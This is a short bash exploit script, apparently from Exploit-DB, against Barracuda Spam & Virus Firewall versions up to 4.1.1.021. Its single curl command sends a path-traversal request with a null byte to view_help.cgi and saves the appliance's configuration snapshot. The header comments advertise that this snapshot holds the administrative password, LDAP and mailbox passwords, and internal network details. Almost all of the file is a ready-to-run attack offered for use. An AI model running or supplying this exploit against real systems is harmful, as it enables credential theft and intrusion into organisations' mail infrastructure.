#!/bin/bash
# Exploit by ShadowHatesYou
# Shadow@SquatThis.net
#
# The resulting output is an SQL dump containing the Barracuda's configuration, which includes goodies such as:
#
# The administrative password for the BSF(system_password)
# MTA LDAP passwords(mta_ldap_advanced_password)
# Password for each configured mailbox(user_password)
# Internal networking information(system_gateway, system_ip, system_netmask, system_primary_dns_server, system_secondary_dns_server)
#
#
# Exploit-DB Notes:
# If /cgi-mod/view_help.cgi returns a 404, try /cgi-bin/view_help.cgi instead. You should be able to determine this manually since Barracuda automatically redirects you to the login page anyway.

if [ $# != 1 ]; then
	echo "# Barracuda Networks Spam & Virus Firewall <= 4.1.1.021 Remote Configuration Retrieval"
	echo "# Use: $0 <host/ip> "
	echo "#"
	exit;
fi;
curl http://$1:8000/cgi-mod/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00 > $1.config
ls -hl $1.config